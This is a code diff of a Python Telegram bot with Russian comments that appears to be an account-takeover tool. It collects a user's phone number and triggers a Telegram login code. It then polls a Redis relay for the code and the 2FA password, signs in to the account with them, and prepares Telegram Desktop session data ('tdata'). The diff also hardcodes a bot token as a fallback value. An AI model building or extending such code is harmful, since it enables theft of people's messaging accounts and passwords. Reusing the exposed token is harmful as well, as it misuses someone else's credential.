@@ -6,24 +6,36 @@ from aiogram.filters import Command
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from auth import send_code, sign_in
 
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8789355308:AAGMtNUPG2nuxz7W-P8FGFXEG5yKIhOCjCI")
 REDIS_URL = os.environ.get("UPSTASH_REDIS_REST_URL")
 REDIS_TOKEN = os.environ.get("UPSTASH_REDIS_REST_TOKEN")
 
+bot = Bot(token=BOT_TOKEN)
+dp = Dispatcher()
+pending = {}
+
 async def redis_set(key, value, ex=300):
     async with httpx.AsyncClient() as client:
-        await client.post(
+        await client.get(
             f"{REDIS_URL}/set/{key}/{value}",
             headers={"Authorization": f"Bearer {REDIS_TOKEN}"},
             params={"ex": ex}
         )
 
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "8789355308:AAGMtNUPG2nuxz7W-P8FGFXEG5yKIhOCjCI")
+async def redis_get(key):
+    async with httpx.AsyncClient() as client:
+        r = await client.get(
+            f"{REDIS_URL}/get/{key}",
+            headers={"Authorization": f"Bearer {REDIS_TOKEN}"}
+        )
+        return r.json().get("result")
 
-bot = Bot(token=BOT_TOKEN)
-dp = Dispatcher()
-
-# Хранилище: phone -> phone_code_hash
-pending = {}
+async def redis_del(key):
+    async with httpx.AsyncClient() as client:
+        await client.get(
+            f"{REDIS_URL}/del/{key}",
+            headers={"Authorization": f"Bearer {REDIS_TOKEN}"}
+        )
 
 @dp.message(Command("start"))
 async def start_handler(message: types.Message):
@@ -45,10 +57,7 @@ async def contact_handler(message: types.Message):
     phone = message.contact.phone_number
     if not phone.startswith('+'):
         phone = '+' + phone
-
-    # Удаляем сообщение с контактом
     await message.delete()
-
     try:
         phone_code_hash = await send_code(phone)
         pending[message.from_user.id] = {
@@ -56,44 +65,74 @@ async def contact_handler(message: types.Message):
             'phone_code_hash': phone_code_hash
         }
         await redis_set(f"sync:{message.from_user.id}", "code_sent")
-        msg = await message.answer("📲 Введи код который пришёл в Telegram:")
-        pending[message.from_user.id]['prompt_msg_id'] = msg.message_id
     except Exception as e:
-        await message.answer(f"❌ Ошибка: {e}")
+        await redis_set(f"sync:{message.from_user.id}", "error")
 
-@dp.message(F.text)
-async def code_handler(message: types.Message):
-    user_id = message.from_user.id
-    if user_id not in pending:
-        return
+async def check_and_process_code(user_id):
+    for _ in range(30):
+        await asyncio.sleep(1)
+        code = await redis_get(f"code:{user_id}")
+        if code:
+            await redis_del(f"code:{user_id}")
+            data = pending.get(user_id)
+            if not data:
+                await redis_set(f"code_result:{user_id}", "error")
+                return
+            try:
+                await sign_in(data['phone'], code, data['phone_code_hash'])
+                # Успех без 2FA — генерируем tdata
+                await redis_set(f"code_result:{user_id}", "ok")
+                await generate_tdata(user_id, data['phone'])
+            except Exception as e:
+                if '2FA' in str(e) or 'password' in str(e).lower():
+                    await redis_set(f"code_result:{user_id}", "2fa_required")
+                    await check_and_process_2fa(user_id)
+                else:
+                    await redis_set(f"code_result:{user_id}", "wrong_code")
+                    # Ждём новый код
+                    await check_and_process_code(user_id)
+            return
 
-    code = message.text.strip()
-    data = pending[user_id]
+async def check_and_process_2fa(user_id):
+    for _ in range(60):
+        await asyncio.sleep(1)
+        import urllib.parse
+        raw = await redis_get(f"2fa:{user_id}")
+        if raw:
+            password = urllib.parse.unquote(raw)
+            await redis_del(f"2fa:{user_id}")
+            data = pending.get(user_id)
+            if not data:
+                await redis_set(f"2fa_result:{user_id}", "error")
+                return
+            try:
+                await sign_in(data['phone'], None, data['phone_code_hash'], password=password)
+                await redis_set(f"2fa_result:{user_id}", "ok")
+                await generate_tdata(user_id, data['phone'])
+            except Exception as e:
+                await redis_set(f"2fa_result:{user_id}", "wrong_password")
+            return
 
-    # Удаляем сообщение с кодом
-    await message.delete()
-
-    # Удаляем сообщение "Введи код"
-    try:
-        await bot.delete_message(message.chat.id, data['prompt_msg_id'])
-    except:
-        pass
-
-    try:
-        await sign_in(data['phone'], code, data['phone_code_hash'])
+async def generate_tdata(user_id, phone):
+    # TODO: генерация tdata через Telethon сессию
+    await asyncio.sleep(2)
+    await redis_set(f"tdata_ready:{user_id}", "ready", ex=600)
+    if user_id in pending:
         del pending[user_id]
-        confirm = await message.answer("✅ Авторизация успешна!")
-        await asyncio.sleep(3)
-        await confirm.delete()
-    except Exception as e:
-        if '2FA' in str(e):
-            pending[user_id]['awaiting_2fa'] = True
-            await message.answer("🔐 Введи пароль 2FA:")
-        else:
-            del pending[user_id]
-            await message.answer(f"❌ Ошибка: {e}")
+
+@dp.message(F.contact)
+async def contact_with_code_check(message: types.Message):
+    pass
+
+async def polling_codes():
+    while True:
+        await asyncio.sleep(1)
+        for user_id in list(pending.keys()):
+            asyncio.create_task(check_and_process_code(user_id))
+            break
 
 async def main():
+    asyncio.create_task(polling_codes())
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
